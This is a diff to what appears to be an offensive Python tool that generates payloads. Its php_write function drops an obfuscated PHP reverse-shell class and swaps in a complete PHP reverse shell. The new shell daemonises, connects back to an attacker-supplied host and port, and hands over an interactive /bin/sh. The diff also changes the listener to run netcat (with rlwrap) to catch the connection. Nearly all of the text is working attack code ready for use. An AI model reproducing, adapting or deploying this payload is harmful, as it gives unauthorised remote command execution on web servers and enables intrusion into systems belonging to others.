@@ -212,235 +212,144 @@ def php_write(lhost,lport):
 
     file_name = "shell.php"
     f = open(file_name,"w")
-    
-    f.write("<?php class Sh\n")
-    f.write("{\n")
-    f.write("private $a = null;\n")
-    f.write("private $p = null;\n")
-    f.write("private $os = null;\n")
-    f.write("private $sh = null;\n")
-    f.write("private $ds = array(\n")
-    f.write("0 => array(\n")
-    f.write("'pipe',\n")
-    f.write("'r'\n")
-    f.write(") ,\n")
-    f.write("1 => array(\n")
-    f.write("'pipe',\n")
-    f.write("'w'\n")
-    f.write(") ,\n")
-    f.write("2 => array(\n")
-    f.write("'pipe',\n")
-    f.write("'w'\n")
-    f.write(")\n")
-    f.write(");\n")
-    f.write("private $o = array();\n")
-    f.write("private $b = 1024;\n")
-    f.write("private $c = 0;\n")
-    f.write("private $e = false;\n")
-    f.write("public function __construct($a, $p)\n")
-    f.write("{\n")
-    f.write("$this->a = $a;\n")
-    f.write("$this->p = $p;\n")
-    f.write("if (stripos(PHP_OS, 'LINUX') !== false)\n")
-    f.write("{\n")
-    f.write("$this->os = 'LINUX';\n")
-    f.write("$this->sh = '/bin/sh';\n")
-    f.write("}\n")
-    f.write("else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false)\n")
-    f.write("{\n")
-    f.write("$this->os = 'WINDOWS';\n")
-    f.write("$this->sh = 'cmd.exe';\n")
-    f.write("$this->o['bypass_shell'] = true;\n")
-    f.write("}\n")
-    f.write("else\n")
-    f.write("{\n")
-    f.write("$this->e = true;\n")
-    f.write("echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("private function dem()\n")
-    f.write("{\n")
-    f.write("$e = false;\n")
-    f.write("@error_reporting(0);\n")
-    f.write("@set_time_limit(0);\n")
-    f.write("if (!function_exists('pcntl_fork'))\n")
-    f.write("{\n")
-    f.write("echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n")
-    f.write("}\n")
-    f.write("else if (($p = @pcntl_fork()) < 0)\n")
-    f.write("{\n")
-    f.write("echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n")
-    f.write("}\n")
-    f.write("else if ($p > 0)\n")
-    f.write("{\n")
-    f.write("$e = true;\n")
-    f.write("echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n")
-    f.write("}\n")
-    f.write("else if (posix_setsid() < 0)\n")
-    f.write("{\n")
-    f.write("echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n")
-    f.write("}\n")
-    f.write("else\n")
-    f.write("{\n")
-    f.write("echo \"DAEMONIZE: Completed successfully!\\n\";\n")
-    f.write("}\n")
-    f.write("@umask(0);\n")
-    f.write("return $e;\n")
-    f.write("}\n")
-    f.write("private function d($d)\n")
-    f.write("{\n")
-    f.write("$d = str_replace('<', '<', $d);\n")
-    f.write("$d = str_replace('>', '>', $d);\n")
-    f.write("echo $d;\n")
-    f.write("}\n")
-    f.write("private function r($s, $n, $b)\n")
-    f.write("{\n")
-    f.write("if (($d = @fread($s, $b)) === false)\n")
-    f.write("{\n")
-    f.write("$this->e = true;\n")
-    f.write("echo \"STRM_ERROR: Cannot read from ${n}, script will now exit...\\n\";\n")
-    f.write("}\n")
-    f.write("return $d;\n")
-    f.write("}\n")
-    f.write("private function w($s, $n, $d)\n")
-    f.write("{\n")
-    f.write("if (($by = @fwrite($s, $d)) === false)\n")
-    f.write("{\n")
-    f.write("$this->e = true;\n")
-    f.write("echo \"STRM_ERROR: Cannot write to ${n}, script will now exit...\\n\";\n")
-    f.write("}\n")
-    f.write("return $by;\n")
-    f.write("}\n")
-    f.write("private function rw($i, $o, $in, $on)\n")
-    f.write("{\n")
-    f.write("while (($d = $this->r($i, $in, $this->b)) && $this->w($o, $on, $d))\n")
-    f.write("{\n")
-    f.write("if ($this->os === 'WINDOWS' && $on === 'STDIN')\n")
-    f.write("{\n")
-    f.write("$this->c += strlen($d);\n")
-    f.write("}\n")
-    f.write("$this->d($d);\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("private function brw($i, $o, $in, $on)\n")
-    f.write("{\n")
-    f.write("$s = fstat($i) ['size'];\n")
-    f.write("if ($this->os === 'WINDOWS' && $in === 'STDOUT' && $this->c)\n")
-    f.write("{\n")
-    f.write("while ($this->c > 0 && ($by = $this->c >= $this->b ? $this->b : $this->c) && $this->r($i, $in, $by))\n")
-    f.write("{\n")
-    f.write("$this->c -= $by;\n")
-    f.write("$s -= $by;\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("while ($s > 0 && ($by = $s >= $this->b ? $this->b : $s) && ($d = $this->r($i, $in, $by)) && $this->w($o, $on, $d))\n")
-    f.write("{\n")
-    f.write("$s -= $by;\n")
-    f.write("$this->d($d);\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("public function rn()\n")
-    f.write("{\n")
-    f.write("if (!$this->e && !$this->dem())\n")
-    f.write("{\n")
-    f.write("$soc = @fsockopen($this->a, $this->p, $en, $es, 30);\n")
-    f.write("if (!$soc)\n")
-    f.write("{\n")
-    f.write("echo \"SOC_ERROR: {$en}: {$es}\\n\";\n")
-    f.write("}\n")
-    f.write("else\n")
-    f.write("{\n")
-    f.write("stream_set_blocking($soc, false);\n")
-    f.write("$proc = @proc_open($this->sh, $this->ds, $pps, '/', null, $this->o);\n")
-    f.write("if (!$proc)\n")
-    f.write("{\n")
-    f.write("echo \"PROC_ERROR: Cannot start the shell\\n\";\n")
-    f.write("}\n")
-    f.write("else\n")
-    f.write("{\n")
-    f.write("foreach ($ps as $pp)\n")
-    f.write("{\n")
-    f.write("stream_set_blocking($pp, false);\n")
-    f.write("}\n")
-    f.write("@fwrite($soc, \"SOCKET: Shell has connected! PID: \" . proc_get_status($proc) ['pid'] . \"\\n\");\n")
-    f.write("do\n")
-    f.write("{\n")
-    f.write("if (feof($soc))\n")
-    f.write("{\n")
-    f.write("echo \"SOC_ERROR: Shell connection has been terminated\\n\";\n")
-    f.write("break;\n")
-    f.write("}\n")
-    f.write("else if (feof($pps[1]) || !proc_get_status($proc) ['running'])\n")
-    f.write("{\n")
-    f.write("echo \"PROC_ERROR: Shell process has been terminated\\n\";\n")
-    f.write("break;\n")
-    f.write("}\n")
-    f.write("$s = array(\n")
-    f.write("'read' => array(\n")
-    f.write("$soc,\n")
-    f.write("$pps[1],\n")
-    f.write("$pps[2]\n")
-    f.write(") ,\n")
-    f.write("'write' => null,\n")
-    f.write("'except' => null\n")
-    f.write(");\n")
-    f.write("$ncs = @stream_select($s['read'], $s['write'], $s['except'], null);\n")
-    f.write("if ($ncs === false)\n")
-    f.write("{\n")
-    f.write("echo \"STRM_ERROR: stream_select() failed\\n\";\n")
-    f.write("break;\n")
-    f.write("}\n")
-    f.write("else if ($ncs > 0)\n")
-    f.write("{\n")
-    f.write("if ($this->os === 'LINUX')\n")
-    f.write("{\n")
-    f.write("if (in_array($soc, $s['read']))\n")
-    f.write("{\n")
-    f.write("$this->rw($soc, $pps[0], 'SOCKET', 'STDIN');\n")
-    f.write("}\n")
-    f.write("if (in_array($pps[2], $s['read']))\n")
-    f.write("{\n")
-    f.write("$this->rw($pps[2], $soc, 'STDERR', 'SOCKET');\n")
-    f.write("}\n")
-    f.write("if (in_array($pps[1], $s['read']))\n")
-    f.write("{\n")
-    f.write("$this->rw($pps[1], $soc, 'STDOUT', 'SOCKET');\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("else if ($this->os === 'WINDOWS')\n")
-    f.write("{\n")
-    f.write("if (in_array($soc, $s['read']))\n")
-    f.write("{\n")
-    f.write("$this->rw($soc, $pps[0], 'SOCKET', 'STDIN');\n")
-    f.write("}\n")
-    f.write("if (fstat($pps[2]) ['size'])\n")
-    f.write("{\n")
-    f.write("$this->brw($pps[2], $soc, 'STDERR', 'SOCKET');\n")
-    f.write("}\n")
-    f.write("if (fstat($pps[1]) ['size'])\n")
-    f.write("{\n")
-    f.write("$this->brw($pps[1], $soc, 'STDOUT', 'SOCKET');\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("while (!$this->e);\n")
-    f.write("foreach ($pps as $pp)\n")
-    f.write("{\n")
-    f.write("fclose($pp);\n")
-    f.write("}\n")
-    f.write("proc_close($proc);\n")
-    f.write("}\n")
-    f.write("fclose($soc);\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("}\n")
-    f.write("echo '<pre>';\n")
-    f.write(f"$sh = new Sh('{lhost}', {lport});\n")
-    f.write("$sh->rn();\n")
-    f.write("echo '</pre>';\n")
-    f.write("unset($sh);  ?>\n")
+   
+    php_script = """
+
+<?php
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '{lhost}';  
+$port = {lport};       
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+
+if (function_exists('pcntl_fork')) {
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+chdir("/");
+
+umask(0);
+
+
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?> 
+
+
+    """
+
+
+    php_script = php_script.replace("{lhost}",lhost)
+    php_script = php_script.replace("{lport}",lport)
+
+    f.write(php_script)
 
     f.close()
 
@@ -512,8 +421,10 @@ def compile(file_name,f_format):
     print(bcolors.ENDC)
 
 def listener(lport):
-    os.system(f"nc -lnvp {lport}")
-
+    try:
+        os.system(f"rlwrap nc -lnvp {lport}")
+    except:
+        os.system(f"nc -lnvp {lport}")
 
 if __name__ == "__main__":
 
